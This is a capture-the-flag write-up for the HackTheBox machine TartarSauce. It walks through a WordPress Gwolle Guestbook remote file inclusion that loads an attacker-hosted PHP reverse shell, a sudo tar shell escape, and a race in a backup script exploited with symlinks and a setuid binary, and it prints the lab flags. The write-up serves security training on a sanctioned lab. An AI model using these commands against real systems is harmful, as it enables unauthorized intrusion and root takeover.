---
title: HackTheBox - TartarSauce
categories: [HackTheBox, HTB-Linux]
date: 2022-09-09
tags: [linux-priv-esc/sudo/gtfo-bin, tcp/80-http/cms/wordpress-plugin]
img_path: /Writeups/HackTheBox/Linux/TartarSauce/images/
image:
  src: Pasted%20image%2020220910011653.png
  width: 1000   # in pixels
  height: 400   # in pixels
---


# Overview 
This machine begins w/ thorough web enumeration, there is a `robots.txt` in the root directory of the webserver, leading us into a rabbit hole `monstra-3.0.4` CMS, there is an exploit for it but it does not work due to permissions in the web directory. 

After further enumerating the web directory, specifically `webservices`, wordpress CMS is found and after enumerating it, there is an plugin RFI exploit that works, but the auther of the machine purposefully edited the changelog, tricking us into thinking that the exploit is patched, but in reality it still works, allowing us to obtain a low-privilege/`www-data` shell.

For the privilege escalation part, we have to privilege escalate to `onuma` and then to `root`. User `www-data` has a sudoers entry that allows `www-data` to run `tar` as `onuma`, `tar` has a GTFOBins entry that allows us to privilege escalate to `onuma`.

To privilege escalate to `root`, we have to do an exploit that is similar to NFS no_root_squash exploit, it is similar because just like no_root_squash, on root, we are supposed to create a SUID binary w/ setuid bit set on the shared directory, on the victim, the permission of the shared directory remains the same. For tar it is similar to it, the permissions of the files remains the same when extracted, so by creating a setuid file w/ setuid bet set on `kali` and archiving it, the permission (setuid bit file) will be the same when the archive is extracted on `tartarsauce.htb`. 

After enumerating the system, there is a bashscript called `backuperer` that archives the web directory, extracts the archive and compares it to the web directory, its purpose is to ensure that the web directory remains in its original state. However it can be exploited, after the archive of the web directory is created, and **just before** the archive is extracted for comparison, there is a 30 seconds sleep. During that sleep, we are able to replace the archive w/ our own version of it that contains a SUID file. Our archive will be extracted into a directory `/var/tmp/check` and since it differs from the web directory, `/var/tmp/check` will not be deleted, allowing us to execute the SUID file privilege escalating us to `root`.

# Takeaways
The privilege escalation is really challenging, I learnt that if there is a complicated script, I should break down the commands one by one and slowly understand it. Also I learnt that `tar` can be exploited in such a way.


---

| Column       | Details     |
| ------------ | ----------- |
| Box Name     | TartarSauce |
| IP           | 10.10.10.88 |
| Points       | -           |
| Difficulty   | Medium      |
| Creator      |  [3mrgnc3](https://www.hackthebox.com/home/users/profile/6983) & [ihack4falafel](https://www.hackthebox.com/home/users/profile/2963)            |
| Release Date | 12-May-2018            |


# Recon

## TCP/80 (HTTP)
- FFUF
	```
	200      GET      563l      128w    10766c http://10.10.10.88/index.html
	200      GET        7l       12w      208c http://10.10.10.88/robots.txt
	403      GET       11l       32w      299c http://10.10.10.88/server-status
	301      GET        9l       28w      316c http://10.10.10.88/webservices => http://10.10.10.88/webservices/
	 
	```
	- `webservices`
	- `robots.txt`



# Initial Foothold

## TCP/80 (HTTP) - Enumerating monstra CMS
1. View `robots.txt`
	```
	┌──(root💀kali)-[~/htb/tartarsauce]
	└─# curl http://tartarsauce.htb/robots.txt
	User-agent: *
	Disallow: /webservices/tar/tar/source/
	Disallow: /webservices/monstra-3.0.4/
	Disallow: /webservices/easy-file-uploader/
	Disallow: /webservices/developmental/
	Disallow: /webservices/phpmyadmin/
	```
	- `/webservices/monstra-3.0.4/` - `200 FOUND`
2. Proceed to `/webservices/monstra-3.0.4/admin`
	![](Pasted%20image%2020220904022810.png)
3. Successfully, login w/ `admin:admin`
	![](Pasted%20image%2020220904023448.png)
4. Search exploits for `Monstra 3.0.4`

	| Exploit Title                                                                     | Path                  |
	| --------------------------------------------------------------------------------- | --------------------- |
	| Monstra CMS 3.0.4 - Remote Code Execution (Authenticated)                         | php/webapps/49949.py  |
	| Monstra CMS 3.0.4 - Authenticated Arbitrary File Upload                           | php/webapps/48479.txt |
	| Monstra CMS 3.0.4 - Arbitrary Folder Deletion                                     | php/webapps/44512.txt |
	| Monstra CMS 3.0.4 - (Authenticated) Arbitrary File Upload / Remote Code Execution | php/webapps/43348.txt |

5. Tried all exploits, did not work, this is probably a rabbit-hole.

## TCP/80 (HTTP) - WP Plugin Gwolle Guestbook 1.5.3 
1. We have to do further enumeration, since the directory `webservices` suggests that there could be other CMS running on this webserver, we directory enumerate it.
	```
	┌──(root💀kali)-[~/htb/tartarsauce]
	└─# ffuf -u http://tartarsauce.htb/webservices/FUZZ -w /usr/share/wordlists/dirb/common.txt 
	wp                      [Status: 301, Size: 327, Words: 20, Lines: 10]
	```
	- `wp` - wordpress CMS
2. Enumerate wordpress
	1. Enumerate users
		```
		┌──(root💀kali)-[~/htb/tartarsauce]                                                                                                                                         └─# wpscan --no-update --disable-tls-checks --url http://tartarsauce.htb/webservices/wp -e u -f cli-no-color 2>&1 | tee "tcp_80_http_wpscan_user_enum.txt" 
		
		[+] wpadmin
		 | Found By: Rss Generator (Passive Detection)
		 | Confirmed By:
		 |  Wp Json Api (Aggressive Detection)
		 |   - http://tartarsauce.htb/webservices/wp/index.php/wp-json/wp/v2/users/?per_page=100&page=1
		 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
		 |  Login Error Messages (Aggressive Detection)
		```
		- `wpadmin`
	2. Enumerate plugins
		```
		┌──(root💀kali)-[~/htb/tartarsauce]                                                                                                                                         
		└─# wpscan --no-update --disable-tls-checks --plugins-detection aggressive --plugins-version-detection aggressive --url http://tartarsauce.htb/webservices/wp -e ap -f cli-n
		o-color 2>&1 | tee "tcp_80_http_wpscan_plugin_enum.txt" 
		
		[+] brute-force-login-protection
		 | Location: http://tartarsauce.htb/webservices/wp/wp-content/plugins/brute-force-login-protection/
		 | Latest Version: 1.5.3 (up to date)
		 | Last Updated: 2017-06-29T10:39:00.000Z
		 | Readme: http://tartarsauce.htb/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt
		 |
		 | Found By: Known Locations (Aggressive Detection)
		 |  - http://tartarsauce.htb/webservices/wp/wp-content/plugins/brute-force-login-protection/, status: 403
		 |
		 | Version: 1.5.3 (100% confidence)
		 | Found By: Readme - Stable Tag (Aggressive Detection)
		 |  - http://tartarsauce.htb/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt
		 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
		 |  - http://tartarsauce.htb/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt
		
		[+] gwolle-gb
		 | Location: http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/
		 | Last Updated: 2021-12-09T08:36:00.000Z
		 | Readme: http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
		 | [!] The version is out of date, the latest version is 4.2.1
		 |
		 | Found By: Known Locations (Aggressive Detection)
		 |  - http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200
		 |
		 | Version: 2.3.10 (100% confidence)
		 | Found By: Readme - Stable Tag (Aggressive Detection)
		 |  - http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
		 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
		 |  - http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
		```
		- `gwolle-gb` - not vulnerable
		- `brute-force-login-protection` - not vulnerable
	3. Even though the plugins are not vulnerable, try the exploits
	4. Search exploits for `brute-force-login-protection`
		- No results
	5. Search exploits for `gwolle-gb`

		| Exploit Title | Path |
		| ------------- | ---- |
		|   WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion                                                                           | php/webapps/38861.txt
	6. Try `php/webapps/38861.txt`
		1. How does it work?
			- Gwolle guestbook is vulnerable to remote file inclusion
			- HTTP GET parameter "abspath" is not being properly sanitized before being used in PHP require() function. A remote attacker can include a file named `wp-load.php` from arbitrary remote server and execute its content on the vulnerable web server.
			- `http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]`
		2. Rename `php-reverse-shell.php` to `wp-load.php`
		3. Start python web server hosting `wp-load.php`
		4. Start listener
		5. Invoke reverse shell
			```
			┌──(root💀kali)-[~/htb/tartarsauce]
			└─# curl http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.13:80/
			```
		6. Obtained `www-data` shell
			![](Pasted%20image%2020220907050822.png)
		7. [Stabalize shell](https://null-byte.wonderhowto.com/how-to/upgrade-dumb-shell-fully-interactive-shell-for-more-flexibility-0197224/)
3. Demo - WP Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion     
	<html>
	<head>
	<link rel="stylesheet" type="text/css" href="/asciinema-player.css" />
	</head>
	<body>
	<div id="wp_exploit"></div>
	<script src="/asciinema-player.min.js"></script>
	<script>
		AsciinemaPlayer.create('https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/TartarSauce/images/wp_exploit.cast', document.getElementById('wp_exploit'), { 
		loop: true,
		autoPlay: true
			});
	</script>
	</body>
	</html>

# Privilege Escalation - 1

## Onuma - Via SUDO GTFOBIN
1. Check sudo access for user `www-data`
	```
	www-data@TartarSauce:/var/www/html/webservices/monstra-3.0.4$ sudo -l
	Matching Defaults entries for www-data on TartarSauce:
	    env_reset, mail_badpass,
	    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
	
	User www-data may run the following commands on TartarSauce:
	    (onuma) NOPASSWD: /bin/tar
	www-data@TartarSauce:/var/www/html/
	```
	- `/bin/tar` - `tar` has a [GTFOBins entry](https://gtfobins.github.io/gtfobins/tar/#sudo)
2. Using `tar` to privilege escalate
	1. How does it work?
		1. If `tar` is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
	2. Privilege escalate
		```
		www-data@TartarSauce:/$ sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
		tar: Removing leading `/' from member names
		$ id;whoami
		uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
		onuma
		$ 
		```
		![](Pasted%20image%2020220907053102.png)
3. User Flag
	```
	onuma@TartarSauce:~$ cat user.txt 
	1c4c8a145480c441d6bb10c866d967b8
	```

## Root - Enumeration
1. Found something interesting w/ `linpeas.sh`
	![](Pasted%20image%2020220908011503.png)
	- `backuperer.service` - similar to a cronjob executing periodically
	- `backuperer` file 
2. View contents of `backuperer` file
	![](Pasted%20image%2020220908011902.png)

## Root - What is backuperer doing?
1. Assign variables 
	```
	# Line 11-17
	basedir=/var/www/html
	bkpdir=/var/backups
	tmpdir=/var/tmp
	testmsg=/var/backups/onuma_backup_test.txt
	errormsg=/var/backups/onuma_backup_error.txt
	tmpfile=/var/tmp/.RANDOM
	check=/var/tmp/check
	```
2. Print date of when `backuperer` was last run
3. Remove `/var/tmp/.RANDOM` and `/var/tmp/check`
	```
	# Line 31
	/bin/rm -rf $tmpdir/.* $check
	```
4. Create an archive called `/var/tmp/.RANDOM` from `/var/www/html`, w/ `gzip`
	```
	/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &
	```
5. Sleep for 30 seconds
	```
	# Line 38
	/bin/sleep 30
	```
5. Create a directory `/var/tmp/check`
6. Change directory to `/var/tmp/check`, extract archive from earlier, `/var/tmp/.RANDOM` 
	```
	# Line 47
	/bin/tar -zxvf $tmpfile -C $check
	```
7. Compares `/var/www/html` against `/var/tmp/check/var/www/html` 
8. If the directories are not the same, 
	1. Append "Integrity Check Error...." AND date of archive (`/var/tmp/.RANDOM`) into `/var/backups/onuma_backup_error.txt`
	2. Append output of `diff` into `/var/backups/onuma_backup_error.txt`
		```
		# Line 48-53
		if [[ $(integrity_chk) ]]
		then
			# Report errors so the dev can investigate the issue.
			/usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
			integrity_chk >> $errormsg
			exit 2
		```
9. If the directories are the same,
	1. Rename and move file `/var/tmp/.RANDOM` to `/var/backups/onuma-www-dev.bak` 
	2. AND remove directory `/var/tmp/check`  and `/var/tmp/.RANDOM`
		```
		# Line 54-59
		else
			# Clean up and save archive to the bkpdir.
			/bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
			/bin/rm -rf $check .*
			exit 0
		fi
		```


## Root - exploiting backuperer
1. How do we exploit `backuperer`?
	- `/usr/bin/diff` - If there is a difference found in the contents of the file, the contents of the specified files will be displayed.
		```
		┌──(root💀kali)-[~/htb/tartarsauce/10.10.10.88/loot/test]
		└─# echo "testing1" > test1
		┌──(root💀kali)-[~/htb/tartarsauce/10.10.10.88/loot/test]
		└─# echo "testing2" > test2
		┌──(root💀kali)-[~/htb/tartarsauce/10.10.10.88/loot/test]
		└─# diff test1 test2
		1c1
		<- testing1
		---
		-> testing2
		```
		- To exploit this, we have to take advantage of the 30 second sleep and `diff` outputing the contents of the file.
		- If there is a difference in the content of the archive and `tartarsauce.htb` web directory, the content of the files that are different from each other will be outputed into `/var/backups/onuma_backup_error.txt`

2. Exploiting `backuperer`
	1. Monitor when when `backuperer` is executed
		```
		pspy32 

		# this is better because u can see the exact timing
		watch -n 1 'systemctl list-timers'
		```
	2. Create a backup of `/var/www/html/robots.txt`
		```
		www-data@TartarSauce:/var/www/html$ cat /var/www/robots.txt
		User-agent: *
		Disallow: /webservices/tar/tar/source/
		Disallow: /webservices/monstra-3.0.4/
		Disallow: /webservices/easy-file-uploader/
		Disallow: /webservices/developmental/
		Disallow: /webservices/phpmyadmin/
		
		www-data@TartarSauce:/var/www/html$ cp /var/www/html/robots.txt /tmp/robots.txt.bak
		```
	5. Wait for `backuperer` to execute, an archive (`/var/tmp/.RANDOM`) 
		- This archive contains `robots.txt`
	6. Within 30 seconds after `backuperer` is executed,
		- We have to remove `/var/www/html/robots.txt`
			```
			www-data@TartarSauce:/var/www/html$ rm /var/www/html/robots.txt
			```
		- Create a symlink (`/var/www/html/robots.txt`) pointing to `/root/root.txt`
			```
			www-data@TartarSauce:/var/www/html$ ln -s /root/root.txt robots.txt
			```
	1. After 30 seconds, `/usr/bin/diff` is executed, since the content of `robots.txt` in the  archive & the web directory is different, the contents of both the symlink and the actual `robots.txt` is appended into `/var/backups/onuma_backup_error.txt`
	2. View `/var/backups/onuma_backup_error.txt`, content of `root.txt` resides in it
		```
		www-data@TartarSauce:/var/www$ cat /var/backups/onuma_backup_error.txt | tail -n 1
		94950492344b54734ea2550b122def59
		```
5. Root Flag
	```
	94950492344b54734ea2550b122def59
	```
6. 	Demo - Backuperer read root.txt
	<html>
	<head>
	<link rel="stylesheet" type="text/css" href="/asciinema-player.css" />
	</head>
	<body>
	<div id="symlink"></div>
	<script src="/asciinema-player.min.js"></script>
	<script>
		AsciinemaPlayer.create('https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/TartarSauce/images/symlink.cast', document.getElementById('symlink'), { 
		loop: true,
		autoPlay: true
			});
	</script>
	</body>
	</html>


# Privilege Escalation - 2

## Root - Via exploiting backuperer
1. View system architecture
	```
	www-data@TartarSauce:/$ uname -a
	Linux TartarSauce 4.15.0-041500-generic #201802011154 SMP Thu Feb 1 12:05:23 UTC 2018 i686 athlon i686 GNU/Linux
	```
	- `x86`
2. How do we exploit `backuperer`?
	- This is similar to NFS `no_root_squash` exploit. Whereby the permission of a file when created on our own machine stays when access in the victim's machine.
	- The directory `/var/tmp/check` is created to extract the archive created from (`/var/www/html`) into it, and comparing it to `tartarsauce.htb` web directory to see if there are any changes.
	- If there is any change in content, `/var/tmp/check` will not be deleted, and we can execute the `setuid` file
3. Exploiting `backuperer`
	1. Create setuid file 
		- setuid file
			```
			// cat setuid.c
			#include <unistd.h>
			
			int main()
			{
				setuid(0);
				setgid(0);
				execl("/bin/bash", "bash", (char *)NULL);
				return 0;
			}
			
			// find . -exec './setuid' \;
			```
		- Compile on kali
			```
			┌──(root💀kali)-[~/htb/tartarsauce/10.10.10.88/exploit]
			└─# gcc -m32 -o setuid exploit.c
			```
		- Set permissions 
			```
			┌──(root💀kali)-[~/htb/tartarsauce/10.10.10.88/exploit]
			└─# chmod 4755 setuid 
			┌──(root💀kali)-[~/htb/tartarsauce/10.10.10.88/exploit]
			└─# ls -la setuid 
			-rwsr-xr-x 1 root root 15296 Sep 10 00:19 setuid
			```
	2. Create an archive of `/var/www/html`  on `tartarsauce.htb`, transfer it to `kali`
	3. On `kali`, extract it, copy `setuid` file into the extracted directory `<your directory>/var/www/html/`
		```
		┌──(root💀kali)-[~/htb/tartarsauce/10.10.10.88/exploit]
		└─# cp setuid web_dir/var/www/html/
		
		┌──(root💀kali)-[~/htb/tartarsauce/10.10.10.88/exploit/web_dir/var/www/html]
		└─# ls -la
		total 44
		drwxr-xr-x 3 www-data www-data  4096 Sep 10 00:23 .
		drwxr-xr-x 3 root     root      4096 Sep 10 00:15 ..
		-rw-r--r-- 1 root     root     10766 Feb 22  2018 index.html
		-rw-r--r-- 1 root     root       208 Feb 22  2018 robots.txt
		-rwsr-xr-x 1 root     root     15296 Sep 10 00:23 setuid
		drwxr-xr-x 4 root     root      4096 May 12 18:55 webservices
		
		```
	4. Create archive
		```
		┌──(root💀kali)-[~/htb/tartarsauce/10.10.10.88/exploit/web_dir]
		└─# tar -zcvf sauce_web_dir_suid var/www/html/
		```
	5. Switch user to `onuma` because `/var/tmp/.RANDOM` is owned by `onuma`
	6. Transfer back to `tartarsauce.htb`
		```
		onuma@TartarSauce:/tmp$ wget 10.10.14.17:9090/sauce_web_dir_suid -O /tmp/sauce_web_dir_suid
		```
	8. Wait for `backuperer` to execute, generating `/var/tmp/.RANDOM` archive
	9. Replace our archive w/ `/var/tmp/.RANDOM`
		```
		onuma@TartarSauce:/var/tmp$ cp /tmp/sauce_web_dir_suid /var/tmp/.3f2d27416c4d4e4
		```
	10. Wait for 30seconds
	11. Proceed to `check/var/www/html` & execute `setuid`
		![](Pasted%20image%2020220910011310.png)
	12. Demo - Backuperer SetUID Privilege Escalation
		<html>
		<head>
		<link rel="stylesheet" type="text/css" href="/asciinema-player.css" />
		</head>
		<body>
		<div id="setuid"></div>
		<script src="/asciinema-player.min.js"></script>
		<script>
			AsciinemaPlayer.create('https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/TartarSauce/images/setuid.cast', document.getElementById('setuid'), { 
			loop: true,
			autoPlay: true
				});
		</script>
		</body>
		</html>

